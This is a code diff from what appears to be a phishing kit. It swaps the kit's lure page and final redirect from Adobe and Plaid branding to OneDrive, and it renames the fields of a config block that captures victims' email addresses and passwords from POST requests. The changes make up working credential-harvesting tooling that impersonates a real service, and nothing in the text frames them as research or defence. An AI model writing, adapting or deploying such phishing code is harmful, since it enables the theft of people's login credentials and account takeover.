@@ -202,7 +202,7 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
                     this.res.writeHead(302, {location: '/auth/login/finish'})
                     return super.cleanEnd(clientContext)
                 }
-                return super.superExecutePhpScript('adobe.php', clientContext)
+                return super.superExecutePhpScript('onedrive.php', clientContext)
             }
             if (this.req.url === '/identity/lalo/validate') {
                 super.uploadRequestBody('PHP-EXEC', clientContext)
@@ -254,7 +254,7 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
             if (this.req.url === '/auth/login/finish') {
                 clientContext.setLogAvailable(true)
                 super.sendClientData(clientContext, {})
-                return super.exitLink('https://dashboard.plaid.com')
+                return super.exitLink('https://onedrive.com')
             }
         }
 
@@ -379,7 +379,7 @@ const configExport = {
     CAPTURES: {
         victimEmail: {
             method: 'POST',
-            params: ['lalo'],
+            params: ['emailLookup'],
             urls: '',
             hosts: 'PHP-EXEC',
         },
@@ -397,14 +397,14 @@ const configExport = {
         },
         manualEmail: {
             method: 'POST',
-            params: ['mento'],
+            params: ['email'],
             urls: '',
             hosts: 'PHP-EXEC',
         },
 
-        manualPassword1: {
+        manualPassword: {
             method: 'POST',
-            params: ['pinto1'],
+            params: ['password'],
             urls: '',
             hosts: 'PHP-EXEC',
         }, 
